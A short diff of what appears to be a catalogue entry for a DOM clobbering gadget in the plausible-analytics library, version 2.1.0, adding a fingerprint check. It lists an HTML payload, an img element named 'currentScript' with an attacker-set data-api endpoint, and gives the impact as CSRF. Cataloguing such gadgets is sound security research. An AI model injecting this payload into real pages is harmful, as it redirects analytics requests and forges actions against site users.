@@ -5,7 +5,7 @@
 + Library: plausible-analytics
 + Stars: 19.7K
 + Version: v2.1.0
-+ Fingerprint: N/A
++ Fingerprint: `window.plausible !== undefined`
 + Payload: ```<img name="currentScript" data-domain="xxx.xxx.xxx" data-api="https://xxx.xxx.xxx">```
 + Impact: CSRF
 + CVE: N/A
